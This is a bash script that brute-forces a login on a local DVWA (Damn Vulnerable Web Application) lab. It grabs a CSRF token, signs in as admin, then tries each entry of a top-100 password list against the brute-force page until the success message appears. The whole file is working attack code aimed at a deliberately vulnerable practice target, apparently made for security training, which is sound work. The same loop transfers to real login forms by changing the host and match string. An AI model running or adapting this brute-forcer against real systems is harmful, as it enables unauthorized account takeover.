#!/usr/bin/env bash
# DVWA host
HOST=http://localhost:8086
# create cookie and save csrf token
CSRF=`curl -s -L -c cookies.txt -b cookies.txt "${HOST}/login.php" | grep user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'`
# save session id
SESSIONID=$(grep PHPSESSID cookies.txt | cut -d $'\t' -f7)

# user & password for login to start tasks
USER=admin
LOGIN_PASSWORD=password

# login at login page
curl -v -L -c cookies.txt -b cookies.txt \
-X POST "${HOST}/login.php" \
--data-raw \
"username=${USER}&password=${LOGIN_PASSWORD}&Login=Login&user_token=${CSRF}"

# read each line of password list file
filename='../10-million-password-list-top-100.txt'
while read line; do
echo "using user: $USER and password: $line"
# enter username and password in brute force page: /vulnerabilities/brute/
RES=`curl -L -v -c cookies.txt -b cookies.txt "${HOST}/vulnerabilities/brute/?username=${USER}&password=${line}&Login=Login#"`

if [[ $RES == *"Welcome to the password protected area admin"* ]]; then
  printf "\n 🎉 password found: $line\n"
  break
else
  printf "\n 🥲 trying password: $line but failed.\n"
fi

done < $filename

